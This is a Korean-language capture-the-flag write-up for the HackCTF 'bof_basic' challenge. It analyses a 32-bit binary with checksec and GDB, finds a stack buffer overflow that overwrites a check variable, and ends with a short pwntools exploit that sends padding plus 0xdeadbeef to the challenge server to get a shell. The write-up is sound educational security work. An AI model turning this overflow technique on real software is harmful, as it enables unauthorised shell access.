---
title: "HackCTF bof_basic Write-Up"
tags: ["wargame"]
categories: ["System"]
---

# Index

1. [문제 분석](#문제 분석)

* * *

## 문제 분석

문제 파일을 다운로드 받으면 elf 파일 하나가 다운로드 된 것을 확인할 수 있습니다. 우선 file command와 checksec을 통해 어떤 프로그램인지, 어떤 보호기법이 적용되어 있는지 확인해보았습니다.

```
root@3218f793af99:~/hackctf/bof_basic# file bof_basic
bof_basic: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2f533dce11288567796018c2c74b5d09954e60cd, not stripped

root@3218f793af99:~/hackctf/bof_basic# checksec bof_basic
[*] '/root/hackctf/bof_basic/bof_basic'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

32bit로 만들어진 elf 파일이며 보호 기법은 NX bit 외에 크게 신경 쓸 필요는 없어 보였습니다. 다양한 조건에서 프로그램을 실행하며 테스트를 진행하였습니다.

프로그램을 실행하였을 때 입력 상태로 들어가는 것을 보아 입력값을 기반으로 동작하는 것 같았습니다.

```
root@3218f793af99:~/hackctf/bof_basic# ./bof_basic
TEST HAHAHA

[buf]: TEST HAHAHA

[check] 0x4030201
```

입력값과는 별개로 check 항목이 출력되었습니다. Canary와 같은 경계값을 검사하는 용도로 사용되는 것인가 싶어 overflow가 발생할 수 있을만한 길이의 문자열을 입력해보았습니다.

```
root@3218f793af99:~/hackctf/bof_basic# (python3 -c 'print("A"*100)'; cat) | ./bof_basic

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[check] 0x41414141

You are on the right way!
```

check 항목의 값이 0x41414141(AAAA)로 변조된 것과 함께 "You are on the right way" 라는 문구가 출력되었습니다.

## GDB 분석

프로그램의 동작에 대한 분석이 끝났으므로 gdb를 사용하여 assembly code를 통한 분석을 시도하였습니다. "정상 프로그램의 진행 순서", "Overflow 발생 조건", "비정상 입력을 통한 프로그램의 조작" 총 세 가지의 항목을 기준으로 잡고 진행하였습니다.

### 정상 프로그램 순서

프로그램의 동작은 한 번의 입력과 두 번의 출력, 두 번의 분기문이 존재하였습니다. 먼저 buf에 입력받는 방식은 `fgets()` 함수를 사용하여 `$ebp-0x34`부터 `0x2d` 만큼 입력을 받았습니다.

이후 두 번의 printf문을 통해서 `$ebp-0x34`와 `$ebp-0xc` 위치의 값을 출력하였습니다. 이를 통해서 check의 값은 `$ebp-0xc`에 위치하는 값을 출력하는 것을 알 수 있었습니다.

### Overflow 발생 조건

buf의 입력을 통해서 `$ebp-0xc`에 위치하는 check 값을 변조할 수 있는 점을 확인할 수 있었습니다. buf와 check의 거리를 계산해보면 0x34-0xc로 40 Byte의 간격임을 확인하였습니다.

### 비정상 입력을 통한 프로그램 조작

정상 프로그램에서 두 번의 출력 이후 분기문 하나가 존재하였습니다. 이는 check의 값이 기본값인 0x04030201일 경우 프로그램의 종료로 jmp, 0xdeadbeef일 경우 두 번째 분기문으로 jmp를 수행하였습니다.

두 번째 분기문 또한 마찬가지로 check의 값이 0xdeadbeef인지 아닌지 확인하는 분기문이었으며 만약 맞을 경우 "/bin/dash"를 인자로 system 함수를 실행하였습니다.

## Exploit

앞서 얻은 정보들을 토대로 40 Byte의 padding 이후 0xdeadbeef로 변조하는 exploit code를 작성하였습니다.

```python
#!/usr/bin/python3

import pwn 

p = pwn.remote("ctf.j0n9hyun.xyz", 3000)

padding = b"A"*40

payload = padding + pwn.p32(0xdeadbeef)

p.sendline(payload)

p.interactive()
```
